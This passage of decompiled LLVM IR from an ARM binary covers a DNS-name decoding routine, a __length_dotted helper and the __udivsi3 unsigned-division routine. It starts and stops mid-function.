  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1c050 = load i32, i32* @r4, align 4
  %v6_1c050 = load i32, i32* @r5, align 4
  %v0_1c054 = load i32, i32* @r0, align 4
  store i32 %v0_1c054, i32* %sl.global-to-local, align 4
  %v2_1c054 = icmp eq i32 %v0_1c054, 0
  br i1 %v2_1c054, label %.thread16, label %dec_label_pc_1c0f4.preheader

.thread16:                                        ; preds = %entry
  %v0_1c0601 = load i32, i32* @r2, align 4
  store i32 %v0_1c0601, i32* %sb.global-to-local, align 4
  %v0_1c0642 = load i32, i32* @r3, align 4
  store i32 %v0_1c0642, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1c114

dec_label_pc_1c0f4.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1c060 = load i32, i32* @r2, align 4
  store i32 %v0_1c060, i32* %sb.global-to-local, align 4
  %v0_1c064 = load i32, i32* @r3, align 4
  store i32 %v0_1c064, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_1c0f43952 = load i32, i32* @r1, align 4
  %v2_1c0f44053 = add i32 %v1_1c0f43952, %v0_1c054
  %v3_1c0f44154 = inttoptr i32 %v2_1c0f44053 to i8*
  %v4_1c0f44255 = load i8, i8* %v3_1c0f44154, align 1
  %v6_1c0f44356 = zext i8 %v4_1c0f44255 to i32
  store i32 %v6_1c0f44356, i32* @r4, align 4
  %v2_1c0f84457 = icmp eq i8 %v4_1c0f44255, 0
  br i1 %v2_1c0f84457, label %bb35, label %dec_label_pc_1c078.lr.ph

dec_label_pc_1c078:                               ; preds = %dec_label_pc_1c078.lr.ph, %bb30
  %v2_1c10050 = phi i1 [ %v2_1c1004663, %dec_label_pc_1c078.lr.ph ], [ true, %bb30 ]
  %v6_1c0f448 = phi i32 [ %v6_1c0f44361, %dec_label_pc_1c078.lr.ph ], [ %v6_1c0f4, %bb30 ]
  %v1_1c0f447 = phi i32 [ %v1_1c0f43960, %dec_label_pc_1c078.lr.ph ], [ %v5_1c0a0, %bb30 ]
  %v1_1c07c = and i32 %v6_1c0f448, 192
  br i1 %v2_1c10050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_1c078
  %v1_1c080 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c080 = add i32 %v1_1c080, 1
  store i32 %v2_1c080, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_1c078, %bb
  %v2_1c084 = icmp eq i32 %v1_1c07c, 192
  %v1_1c088 = add i32 %v1_1c0f447, 1
  store i32 %v1_1c088, i32* @r5, align 4
  br i1 %v2_1c084, label %dec_label_pc_1c090, label %dec_label_pc_1c0b0

dec_label_pc_1c090:                               ; preds = %bb28
  %v2_1c090 = add i32 %v1_1c088, %v0_1c090.ph59
  %v3_1c090 = inttoptr i32 %v2_1c090 to i8*
  %v4_1c090 = load i8, i8* %v3_1c090, align 1
  %v6_1c090 = zext i8 %v4_1c090 to i32
  %v1_1c098 = urem i32 %v6_1c0f448, 64
  br i1 %v2_1c10050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_1c090
  %v1_1c09c = load i32, i32* %r8.global-to-local, align 4
  %v2_1c09c = add i32 %v1_1c09c, 1
  store i32 %v2_1c09c, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_1c090, %bb29
  %v4_1c0a0 = mul nuw nsw i32 %v1_1c098, 256
  %v5_1c0a0 = or i32 %v6_1c090, %v4_1c0a0
  store i32 %v5_1c0a0, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_1c0f4 = add i32 %v5_1c0a0, %v0_1c090.ph59
  %v3_1c0f4 = inttoptr i32 %v2_1c0f4 to i8*
  %v4_1c0f4 = load i8, i8* %v3_1c0f4, align 1
  %v6_1c0f4 = zext i8 %v4_1c0f4 to i32
  store i32 %v6_1c0f4, i32* @r4, align 4
  %v2_1c0f8 = icmp eq i8 %v4_1c0f4, 0
  br i1 %v2_1c0f8, label %dec_label_pc_1c100.bb36_crit_edge, label %dec_label_pc_1c078

dec_label_pc_1c0b0:                               ; preds = %bb28
  %v2_1c0b0 = add i32 %v6_1c0f448, %storemerge17.ph58
  store i32 %v2_1c0b0, i32* %r6.global-to-local, align 4
  %v2_1c0b4 = load i32, i32* %stack_var_-40, align 4
  %v1_1c0b8 = add i32 %v2_1c0b0, 1
  store i32 %v1_1c0b8, i32* %r7.global-to-local, align 4
  %v3_1c0bc = icmp ult i32 %v1_1c0b8, %v2_1c0b4
  br i1 %v3_1c0bc, label %dec_label_pc_1c0c4, label %dec_label_pc_1c114

dec_label_pc_1c0c4:                               ; preds = %dec_label_pc_1c0b0
  %v2_1c0c4 = add i32 %v1_1c088, %v0_1c090.ph59
  store i32 %v2_1c0c4, i32* @r1, align 4
  %v0_1c0c8 = load i32, i32* %sb.global-to-local, align 4
  %v2_1c0c8 = add i32 %v0_1c0c8, %storemerge17.ph58
  store i32 %v2_1c0c8, i32* @r0, align 4
  store i32 %v6_1c0f448, i32* @r2, align 4
  %v0_1c0d0 = call i32 @memcpy()
  %v0_1c0d4 = load i32, i32* @r5, align 4
  %v1_1c0d4 = load i32, i32* @r4, align 4
  %v2_1c0d4 = add i32 %v1_1c0d4, %v0_1c0d4
  store i32 %v2_1c0d4, i32* %r1.global-to-local, align 4
  %v0_1c0d8 = load i32, i32* %sl.global-to-local, align 4
  %v2_1c0d8 = add i32 %v0_1c0d8, %v2_1c0d4
  %v3_1c0d8 = inttoptr i32 %v2_1c0d8 to i8*
  %v4_1c0d8 = load i8, i8* %v3_1c0d8, align 1
  %v0_1c0dc = load i32, i32* %fp.global-to-local, align 4
  %v2_1c0dc = icmp eq i32 %v0_1c0dc, 0
  br i1 %v2_1c0dc, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_1c0c4
  %v1_1c0e0 = load i32, i32* %r8.global-to-local, align 4
  %v3_1c0e0 = add i32 %v1_1c0e0, %v1_1c0d4
  store i32 %v3_1c0e0, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_1c0c4, %bb31
  %v2_1c0e4 = icmp eq i8 %v4_1c0d8, 0
  br i1 %v2_1c0e4, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_1c0ec.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_1c0ec = load i32, i32* %sb.global-to-local, align 4
  %v3_1c0ec = load i32, i32* %r6.global-to-local, align 4
  %v4_1c0ec = add i32 %v3_1c0ec, %v2_1c0ec
  %v5_1c0ec = inttoptr i32 %v4_1c0ec to i8*
  store i8 %v0_1c0ec.off0, i8* %v5_1c0ec, align 1
  %v0_1c0f0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1c0f4.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1c100.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1c0f439 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c0f440 = add i32 %v1_1c0f439, %v0_1c0f4.pre.pre
  %v3_1c0f441 = inttoptr i32 %v2_1c0f440 to i8*
  %v4_1c0f442 = load i8, i8* %v3_1c0f441, align 1
  %v6_1c0f443 = zext i8 %v4_1c0f442 to i32
  store i32 %v6_1c0f443, i32* @r4, align 4
  %v2_1c0f844 = icmp eq i8 %v4_1c0f442, 0
  %v2_1c10046 = icmp eq i32 %v0_1c100.pre.pre, 0
  br i1 %v2_1c0f844, label %dec_label_pc_1c100, label %dec_label_pc_1c078.lr.ph

dec_label_pc_1c078.lr.ph:                         ; preds = %dec_label_pc_1c0f4.preheader, %bb34
  %v2_1c1004663 = phi i1 [ %v2_1c10046, %bb34 ], [ false, %dec_label_pc_1c0f4.preheader ]
  %v6_1c0f44361 = phi i32 [ %v6_1c0f443, %bb34 ], [ %v6_1c0f44356, %dec_label_pc_1c0f4.preheader ]
  %v1_1c0f43960 = phi i32 [ %v1_1c0f439, %bb34 ], [ %v1_1c0f43952, %dec_label_pc_1c0f4.preheader ]
  %v0_1c090.ph59 = phi i32 [ %v0_1c0f4.pre.pre, %bb34 ], [ %v0_1c054, %dec_label_pc_1c0f4.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_1c0f0.pre, %bb34 ], [ 0, %dec_label_pc_1c0f4.preheader ]
  br label %dec_label_pc_1c078

dec_label_pc_1c100:                               ; preds = %bb34
  br i1 %v2_1c10046, label %dec_label_pc_1c100.bb36_crit_edge, label %bb35

dec_label_pc_1c100.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_1c100
  %v0_1c108.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c114

bb35:                                             ; preds = %dec_label_pc_1c0f4.preheader, %dec_label_pc_1c100
  %v1_1c104 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c104 = add i32 %v1_1c104, 1
  store i32 %v2_1c104, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c114

dec_label_pc_1c114:                               ; preds = %dec_label_pc_1c0b0, %bb35, %dec_label_pc_1c100.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_1c108.pre, %dec_label_pc_1c100.bb36_crit_edge ], [ %v2_1c104, %bb35 ], [ -1, %dec_label_pc_1c0b0 ]
  store i32 %v3_1c050, i32* @r4, align 4
  store i32 %v6_1c050, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_1c090.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_1c0f4, { 1, 0 }
  uselistorder i32 %v5_1c0a0, { 0, 2, 1 }
  uselistorder i32 %v6_1c0f448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1c10050, { 1, 0 }
  uselistorder i32 %v0_1c054, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 46, { 0, 2, 3, 1, 4 }
  uselistorder i32 ()* @memcpy, { 17, 16, 24, 15, 14, 13, 12, 27, 26, 11, 23, 4, 6, 5, 10, 3, 9, 8, 7, 30, 2, 1, 22, 21, 20, 0, 25, 29, 28, 19, 18 }
  uselistorder i32 64, { 0, 2, 39, 33, 40, 41, 3, 42, 4, 5, 6, 36, 37, 38, 11, 34, 35, 12, 45, 13, 14, 43, 15, 16, 17, 18, 19, 20, 21, 22, 1, 44, 24, 23, 10, 25, 7, 26, 27, 28, 29, 30, 31, 32, 9, 8 }
  uselistorder label %dec_label_pc_1c114, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_1c100.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1c078.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_1c120 = load i32, i32* @r0, align 4
  store i32 %v0_1c120, i32* @lr, align 4
  %v2_1c120 = icmp eq i32 %v0_1c120, 0
  br i1 %v2_1c120, label %bb, label %dec_label_pc_1c138

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_1c130:                               ; preds = %dec_label_pc_1c140
  %v1_1c130 = add i32 %v1_1c148, 2
  br label %dec_label_pc_1c160

dec_label_pc_1c138:                               ; preds = %entry
  %v0_1c138 = load i32, i32* @r1, align 4
  br label %dec_label_pc_1c148

dec_label_pc_1c140:                               ; preds = %dec_label_pc_1c148
  %v1_1c154 = and i32 %v6_1c148, 192
  %v2_1c158 = add i32 %v6_1c148, %v1_1c14c
  %v2_1c140 = icmp eq i32 %v1_1c154, 192
  br i1 %v2_1c140, label %dec_label_pc_1c130, label %dec_label_pc_1c148

dec_label_pc_1c148:                               ; preds = %dec_label_pc_1c140, %dec_label_pc_1c138
  %v1_1c148 = phi i32 [ %v2_1c158, %dec_label_pc_1c140 ], [ %v0_1c138, %dec_label_pc_1c138 ]
  %v2_1c148 = add i32 %v1_1c148, %v0_1c120
  %v3_1c148 = inttoptr i32 %v2_1c148 to i8*
  %v4_1c148 = load i8, i8* %v3_1c148, align 1
  %v6_1c148 = zext i8 %v4_1c148 to i32
  %v1_1c14c = add i32 %v1_1c148, 1
  %v2_1c150 = icmp eq i8 %v4_1c148, 0
  br i1 %v2_1c150, label %dec_label_pc_1c160, label %dec_label_pc_1c140

dec_label_pc_1c160:                               ; preds = %dec_label_pc_1c148, %dec_label_pc_1c130
  %v1_1c160 = phi i32 [ %v1_1c130, %dec_label_pc_1c130 ], [ %v1_1c14c, %dec_label_pc_1c148 ]
  %v2_1c160 = sub i32 %v1_1c160, %v0_1c138
  ret i32 %v2_1c160

; uselistorder directives
  uselistorder i32 %v6_1c148, { 1, 0 }
  uselistorder i32 %v1_1c148, { 2, 1, 0 }
  uselistorder i32 %v0_1c120, { 0, 2, 1 }
  uselistorder i8 0, { 65, 23, 30, 31, 66, 22, 27, 67, 68, 69, 32, 33, 34, 35, 36, 70, 51, 74, 72, 50, 73, 71, 49, 43, 9, 10, 75, 76, 80, 81, 29, 62, 63, 77, 78, 79, 16, 82, 44, 52, 83, 85, 84, 53, 45, 86, 87, 88, 89, 90, 91, 11, 56, 95, 0, 93, 92, 54, 1, 94, 55, 2, 96, 97, 37, 3, 98, 99, 101, 100, 102, 103, 105, 104, 57, 106, 107, 108, 109, 46, 110, 112, 113, 111, 12, 13, 14, 114, 4, 115, 116, 24, 64, 118, 119, 120, 121, 117, 47, 122, 123, 124, 125, 126, 25, 127, 128, 38, 28, 5, 6, 130, 129, 39, 131, 132, 40, 133, 58, 26, 134, 135, 136, 137, 138, 139, 17, 140, 141, 142, 143, 144, 145, 146, 147, 18, 148, 149, 152, 150, 151, 59, 153, 154, 155, 19, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 7, 167, 8, 168, 169, 41, 170, 171, 172, 173, 174, 175, 20, 176, 177, 178, 180, 179, 60, 181, 182, 183, 21, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 48, 15, 196, 194, 195, 197, 198, 199, 200, 203, 202, 61, 201, 204, 205, 206, 207, 208, 209, 210, 217, 211, 216, 215, 213, 212, 214, 42, 218, 219, 220 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1c168 = add i32 %arg2, -1
  %v7_1c168 = icmp eq i32 %arg2, 1
  br i1 %v7_1c168, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_1c16c = load i32, i32* @r0, align 4
  ret i32 %v2_1c16c

bb80:                                             ; preds = %entry
  %v2_1c168 = icmp eq i32 %arg2, 0
  br i1 %v2_1c168, label %dec_label_pc_1c250, label %dec_label_pc_1c174

dec_label_pc_1c174:                               ; preds = %bb80
  %v0_1c174 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_1c174, %arg2
  br i1 %tmp, label %dec_label_pc_1c17c, label %dec_label_pc_1c208

dec_label_pc_1c17c:                               ; preds = %dec_label_pc_1c174
  %v2_1c17c = and i32 %v1_1c168, %arg2
  %v4_1c17c = icmp eq i32 %v2_1c17c, 0
  br i1 %v4_1c17c, label %dec_label_pc_1c214, label %dec_label_pc_1c184

dec_label_pc_1c184:                               ; preds = %dec_label_pc_1c17c
  %v3_1c184 = icmp ult i32 %arg2, 536870912
  br i1 %v3_1c184, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1c184
  %v4_1c188 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1c184, %.thread
  %v0_1c1a8.pr36.ph = phi i32 [ %v4_1c188, %.thread ], [ %arg2, %dec_label_pc_1c184 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1c184 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_1c1a8.pr36 = phi i32 [ %v4_1c19c, %bb83 ], [ %v0_1c1a8.pr36.ph, %.preheader.preheader ]
  %v1_1c1a0 = phi i32 [ %v4_1c1a0, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_1c194 = icmp ugt i32 %v0_1c1a8.pr36, 268435455
  br i1 %v2_1c194, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_1c1a8thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_1c198 = icmp ult i32 %v0_1c1a8.pr36, %v0_1c174
  br i1 %v4_1c198, label %bb82, label %dec_label_pc_1c1a8thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_1c19c = and i32 %v0_1c1a8.pr36, 268435456
  %v3_1c19c = icmp eq i32 %v2_1c19c, 0
  %v4_1c19c = mul i32 %v0_1c1a8.pr36, 16
  br i1 %v3_1c19c, label %bb83, label %dec_label_pc_1c1a8.loopexit

bb83:                                             ; preds = %bb82
  %v2_1c1a0 = and i32 %v1_1c1a0, 268435456
  %v3_1c1a0 = icmp eq i32 %v2_1c1a0, 0
  %v4_1c1a0 = mul i32 %v1_1c1a0, 16
  br i1 %v3_1c1a0, label %.preheader, label %dec_label_pc_1c1a8thread-pre-split.loopexit.loopexit

dec_label_pc_1c1a8thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_1c1b448.ph = phi i32 [ %v1_1c1a0, %bb81 ], [ %v4_1c1a0, %bb83 ]
  %v0_1c1a8.pr38.ph = phi i32 [ %v0_1c1a8.pr36, %bb81 ], [ %v4_1c19c, %bb83 ]
  br label %dec_label_pc_1c1a8thread-pre-split.loopexit

dec_label_pc_1c1a8thread-pre-split.loopexit:      ; preds = %dec_label_pc_1c1a8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1c1b448 = phi i32 [ %v1_1c1a0, %.thread2 ], [ %v1_1c1b448.ph, %dec_label_pc_1c1a8thread-pre-split.loopexit.loopexit ]
  %v0_1c1a8.pr38 = phi i32 [ %v0_1c1a8.pr36, %.thread2 ], [ %v0_1c1a8.pr38.ph, %dec_label_pc_1c1a8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1c1a8thread-pre-split

dec_label_pc_1c1a8thread-pre-split:               ; preds = %dec_label_pc_1c1a8thread-pre-split.loopexit, %bb85
  %v1_1c1b446 = phi i32 [ %v1_1c1b448, %dec_label_pc_1c1a8thread-pre-split.loopexit ], [ %v3_1c1b4, %bb85 ]
  %v0_1c1a8.pr = phi i32 [ %v0_1c1a8.pr38, %dec_label_pc_1c1a8thread-pre-split.loopexit ], [ %v3_1c1b0, %bb85 ]
  br label %dec_label_pc_1c1a8

dec_label_pc_1c1a8.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_1c1a8

dec_label_pc_1c1a8:                               ; preds = %dec_label_pc_1c1a8.loopexit, %dec_label_pc_1c1a8thread-pre-split
  %v1_1c1b4 = phi i32 [ %v1_1c1b446, %dec_label_pc_1c1a8thread-pre-split ], [ %v1_1c1a0, %dec_label_pc_1c1a8.loopexit ]
  %v1_1c1b0 = phi i32 [ %v0_1c1a8.pr, %dec_label_pc_1c1a8thread-pre-split ], [ %v4_1c19c, %dec_label_pc_1c1a8.loopexit ]
  %v2_1c1a8 = icmp slt i32 %v1_1c1b0, 0
  br i1 %v2_1c1a8, label %dec_label_pc_1c1bc, label %bb84

bb84:                                             ; preds = %dec_label_pc_1c1a8
  %v4_1c1ac = icmp ult i32 %v1_1c1b0, %v0_1c174
  br i1 %v4_1c1ac, label %bb85, label %dec_label_pc_1c1bc

bb85:                                             ; preds = %bb84
  %v3_1c1b0 = mul i32 %v1_1c1b0, 2
  %v2_1c1b4 = icmp slt i32 %v1_1c1b4, 0
  %v3_1c1b4 = mul i32 %v1_1c1b4, 2
  br i1 %v2_1c1b4, label %dec_label_pc_1c1bc, label %dec_label_pc_1c1a8thread-pre-split

dec_label_pc_1c1bc:                               ; preds = %bb84, %dec_label_pc_1c1a8, %bb85
  %v2_1c1c859 = phi i32 [ %v3_1c1b4, %bb85 ], [ %v1_1c1b4, %bb84 ], [ %v1_1c1b4, %dec_label_pc_1c1a8 ]
  %v1_1c1c051 = phi i32 [ %v3_1c1b0, %bb85 ], [ %v1_1c1b0, %bb84 ], [ %v1_1c1b0, %dec_label_pc_1c1a8 ]
  br label %dec_label_pc_1c1c0

dec_label_pc_1c1c0:                               ; preds = %.thread11, %dec_label_pc_1c1bc
  %v1_1c1f4 = phi i32 [ %v4_1c1f4, %.thread11 ], [ %v2_1c1c859, %dec_label_pc_1c1bc ]
  %v1_1c1c8 = phi i32 [ %v0_1c200, %.thread11 ], [ 0, %dec_label_pc_1c1bc ]
  %v1_1c1f8 = phi i32 [ %v4_1c1f8, %.thread11 ], [ %v1_1c1c051, %dec_label_pc_1c1bc ]
  %v1_1c1c4 = phi i32 [ %v0_1c1f0, %.thread11 ], [ %v0_1c174, %dec_label_pc_1c1bc ]
  %v3_1c1c0 = icmp ult i32 %v1_1c1c4, %v1_1c1f8
  br i1 %v3_1c1c0, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_1c1c0
  %v3_1c1c4 = sub i32 %v1_1c1c4, %v1_1c1f8
  %v3_1c1c8 = or i32 %v1_1c1c8, %v1_1c1f4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1c1c0, %bb86
  %v1_1c1d0 = phi i32 [ %v1_1c1c4, %dec_label_pc_1c1c0 ], [ %v3_1c1c4, %bb86 ]
  %v1_1c1d4 = phi i32 [ %v1_1c1c8, %dec_label_pc_1c1c0 ], [ %v3_1c1c8, %bb86 ]
  %v4_1c1cc = udiv i32 %v1_1c1f8, 2
  %v6_1c1cc = icmp ult i32 %v1_1c1d0, %v4_1c1cc
  br i1 %v6_1c1cc, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_1c1d0 = urem i32 %v1_1c1f8, 2
  %v4_1c1d0 = icmp eq i32 %v3_1c1d0, 0
  %v6_1c1d0 = sub i32 %v1_1c1d0, %v4_1c1cc
  br i1 %v4_1c1d0, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_1c1d4 = udiv i32 %v1_1c1f4, 2
  %v6_1c1d4 = or i32 %v1_1c1d4, %v5_1c1d4
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_1c1dc = phi i32 [ %v6_1c1d0, %bb87 ], [ %v1_1c1d0, %.thread7 ], [ %v6_1c1d0, %bb88 ]
  %v1_1c1e0 = phi i32 [ %v1_1c1d4, %bb87 ], [ %v1_1c1d4, %.thread7 ], [ %v6_1c1d4, %bb88 ]
  %v4_1c1d8 = udiv i32 %v1_1c1f8, 4
  %v6_1c1d8 = icmp ult i32 %v1_1c1dc, %v4_1c1d8
  br i1 %v6_1c1d8, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_1c1dc = and i32 %v1_1c1f8, 2
  %v4_1c1dc = icmp eq i32 %v3_1c1dc, 0
  %v6_1c1dc = sub i32 %v1_1c1dc, %v4_1c1d8
  br i1 %v4_1c1dc, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1c1e0 = udiv i32 %v1_1c1f4, 4
  %v6_1c1e0 = or i32 %v1_1c1e0, %v5_1c1e0
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_1c1e8 = phi i32 [ %v6_1c1dc, %bb89 ], [ %v1_1c1dc, %.thread8 ], [ %v6_1c1dc, %bb90 ]
  %v1_1c1ec = phi i32 [ %v1_1c1e0, %bb89 ], [ %v1_1c1e0, %.thread8 ], [ %v6_1c1e0, %bb90 ]
  %v4_1c1e4 = udiv i32 %v1_1c1f8, 8
  %v6_1c1e4 = icmp ult i32 %v1_1c1e8, %v4_1c1e4
  br i1 %v6_1c1e4, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_1c1e8 = and i32 %v1_1c1f8, 4
  %v4_1c1e8 = icmp eq i32 %v3_1c1e8, 0
  %v6_1c1e8 = sub i32 %v1_1c1e8, %v4_1c1e4
  br i1 %v4_1c1e8, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_1c1ec = udiv i32 %v1_1c1f4, 8
  %v6_1c1ec = or i32 %v1_1c1ec, %v5_1c1ec
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_1c200 = phi i32 [ %v1_1c1ec, %bb91 ], [ %v1_1c1ec, %.thread9 ], [ %v6_1c1ec, %bb92 ]
  %v0_1c1f0 = phi i32 [ %v6_1c1e8, %bb91 ], [ %v1_1c1e8, %.thread9 ], [ %v6_1c1e8, %bb92 ]
  %v2_1c1f0 = icmp eq i32 %v0_1c1f0, 0
  br i1 %v2_1c1f0, label %dec_label_pc_1c200, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_1c1f4, 16
  br i1 %tmp140, label %dec_label_pc_1c200, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_1c1f4 = udiv i32 %v1_1c1f4, 16
  %v4_1c1f8 = udiv i32 %v1_1c1f8, 16
  br label %dec_label_pc_1c1c0

dec_label_pc_1c200:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_1c200

dec_label_pc_1c208:                               ; preds = %dec_label_pc_1c174
  %v9_1c174 = icmp eq i32 %v0_1c174, %arg2
  %. = zext i1 %v9_1c174 to i32
  ret i32 %.

dec_label_pc_1c214:                               ; preds = %dec_label_pc_1c17c
  %v2_1c214 = icmp ugt i32 %arg2, 65535
  br i1 %v2_1c214, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_1c214
  %v2_1c218 = and i32 %arg2, 32768
  %v3_1c218 = icmp eq i32 %v2_1c218, 0
  %v4_1c218 = udiv i32 %arg2, 65536
  br i1 %v3_1c218, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_1c214
  %v0_1c22465 = phi i32 [ %arg2, %dec_label_pc_1c214 ], [ %v4_1c218, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_1c228 = phi i32 [ %v0_1c22465, %.thread16 ], [ %v4_1c218, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_1c224 = icmp ugt i32 %v1_1c228, 255
  br i1 %v2_1c224, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_1c228 = and i32 %v1_1c228, 128
  %v3_1c228 = icmp eq i32 %v2_1c228, 0
  %v4_1c228 = udiv i32 %v1_1c228, 256
  br i1 %v3_1c228, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1c22c = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_1c238 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_1c22c, %bb100 ]
  %v1_1c234 = phi i32 [ %v1_1c228, %bb98 ], [ %v4_1c228, %bb99 ], [ %v4_1c228, %bb100 ]
  %v2_1c230 = icmp ugt i32 %v1_1c234, 15
  br i1 %v2_1c230, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_1c234 = and i32 %v1_1c234, 8
  %v3_1c234 = icmp eq i32 %v2_1c234, 0
  %v4_1c234 = udiv i32 %v1_1c234, 16
  br i1 %v3_1c234, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_1c238 = add nsw i32 %v1_1c238, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_1c240 = phi i32 [ %v1_1c238, %.thread17 ], [ %v1_1c238, %bb101 ], [ %v2_1c238, %bb102 ]
  %v5_1c244 = phi i32 [ %v1_1c234, %.thread17 ], [ %v4_1c234, %bb101 ], [ %v4_1c234, %bb102 ]
  %v2_1c23c = icmp ugt i32 %v5_1c244, 3
  %v7_1c23c = icmp eq i32 %v5_1c244, 4
  %v2_1c240 = xor i1 %v7_1c23c, true
  %v3_1c240 = and i1 %v2_1c23c, %v2_1c240
  br i1 %v3_1c240, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_1c240 = add nsw i32 %v4_1c240, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_1c244 = phi i32 [ %v4_1c240, %.thread18 ], [ %v5_1c240, %bb103 ]
  %v2_1c244 = xor i1 %v2_1c23c, true
  %v3_1c244 = or i1 %v7_1c23c, %v2_1c244
  br i1 %v3_1c244, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_1c244 = udiv i32 %v5_1c244, 2
  %v9_1c244 = add i32 %v4_1c244, %v8_1c244
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_1c248 = phi i32 [ %v4_1c244, %bb104 ], [ %v9_1c244, %bb105 ]
  %v6_1c248 = lshr i32 %v0_1c174, %v1_1c248
  ret i32 %v6_1c248

dec_label_pc_1c250:                               ; preds = %bb80
  %v0_1c250 = load i32, i32* @lr, align 4
  %v0_1c254 = call i32 @__aeabi_ldiv0()
